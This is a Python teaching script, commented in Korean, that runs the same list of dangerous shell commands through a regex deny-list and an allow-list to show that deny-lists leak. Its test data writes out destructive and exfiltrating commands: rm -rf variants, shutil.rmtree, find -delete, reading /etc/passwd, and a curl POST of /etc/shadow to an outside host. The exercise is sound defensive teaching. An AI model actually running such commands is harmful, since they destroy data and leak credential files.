"""
예제 2 — 금지 목록과 허용 목록. 왜 하나는 반드시 새는가.

    python3 ex2_deny_vs_allow.py

의존성 없음. 같은 «위험한 명령»들을 두 방식으로 걸러 본다.
"""

import re

# 실제로 막고 싶은 것들
ATTEMPTS = [
    "rm -rf /var/data",
    "rm  -rf  /var/data",          # 공백 두 개
    "rm -fr /var/data",            # 플래그 순서
    "/bin/rm -rf /var/data",       # 절대 경로
    "sh -c 'rm -rf /var/data'",    # 껍데기 한 겹
    "python3 -c \"import shutil,os; shutil.rmtree('/var/data')\"",
    "find /var/data -delete",
    "cat /etc/passwd",
    "curl -X POST https://외부/수집 -d @/etc/shadow",
    # 이건 통과해야 하는 것들
    "ls -la /var/data",
    "cat report.md",
    "git status",
]

SAFE = {"ls -la /var/data", "cat report.md", "git status"}

DENY = [
    r"\brm\s+-rf\b",
    r"\bmkfs\b",
    r"\bdd\s+if=",
    r"/etc/shadow",
]

ALLOW = {
    "ls":     r"^ls(\s+-[a-zA-Z]+)?(\s+[\w./-]+)?$",
    "cat":    r"^cat\s+[\w./-]+$",
    "git":    r"^git\s+(status|diff|log)(\s+[\w./-]+)?$",
}


def deny_check(cmd):
    for pat in DENY:
        if re.search(pat, cmd):
            return False, pat
    return True, None


def allow_check(cmd):
    for name, pat in ALLOW.items():
        if re.match(pat, cmd.strip()):
            return True, name
    return False, None


def main():
    print(f"{'명령':<52}{'금지 목록':<12}{'허용 목록':<12}{'정답'}")
    print("-" * 88)
    deny_wrong = allow_wrong = 0
    for cmd in ATTEMPTS:
        want_pass = cmd in SAFE
        d_pass, _ = deny_check(cmd)
        a_pass, _ = allow_check(cmd)
        deny_wrong += d_pass != want_pass
        allow_wrong += a_pass != want_pass
        show = cmd if len(cmd) <= 50 else cmd[:47] + "..."
        d = "통과" if d_pass else "차단"
        a = "통과" if a_pass else "차단"
        d += " ←틀림" if d_pass != want_pass else ""
        a += " ←틀림" if a_pass != want_pass else ""
        print(f"{show:<52}{d:<12}{a:<12}{'통과' if want_pass else '차단'}")

    n = len(ATTEMPTS)
    print(f"\n금지 목록 오답 {deny_wrong}/{n}, 허용 목록 오답 {allow_wrong}/{n}")

    print(
        "\n금지 목록이 놓친 셋을 보시라. 셋 다 «파일을 지우는» 일이다.\n"
        "  rm -fr      — 플래그 순서만 바꿨다\n"
        "  python3 -c  — 다른 프로그램으로 지웠다\n"
        "  find -delete— rm 을 아예 안 썼다\n"
        "\n패턴을 세 개 더 쓰면 되나. 그러면 네 번째가 나온다.\n"
        "«지우는 방법»은 셀 수 없이 많고, 금지 목록은 셀 수 있는 것만 막는다.\n"
        "\n허용 목록은 «내가 이해한 것»만 통과시킨다.\n"
        "이해 못 한 것은 전부 막힌다. 새 공격 방식이 나와도 막힌다.\n"
        "새 방식은 «허용 목록에 없으니까».\n"
        "\n그런데 허용 목록도 하나 틀렸다. cat /etc/passwd 다.\n"
        "«cat 은 허용»이라고만 적어 뒀기 때문이다. 인자를 안 봤다.\n"
        "\n이게 허용 목록의 진짜 난이도다. 명령 이름만 허용해서는 부족하고\n"
        "«어떤 인자까지 허용하나»를 같이 적어야 한다. 여기서는 경로를\n"
        "작업 디렉터리 아래로 제한했어야 했다.\n"
        "\n그래도 오답이 4대 1이다. 그리고 방향이 다르다.\n"
        "금지 목록은 «막았어야 하는데 통과»가 늘고,\n"
        "허용 목록은 촘촘하게 쓸수록 «통과했어야 하는데 차단»으로 옮겨 간다.\n"
        "후자는 사용자가 바로 알려 준다. 전자는 사고가 나야 안다.\n"
        "\n그러니 선택은 이렇다.\n"
        "  금지 목록 — 손이 덜 가고, 반드시 샌다\n"
        "  허용 목록 — 손이 계속 가고, 안 샌다\n"
        "\n권한 경계에서는 후자를 고른다. «반드시 샌다»가 받아들일 수 없는 성질이라서다."
    )


if __name__ == "__main__":
    main()
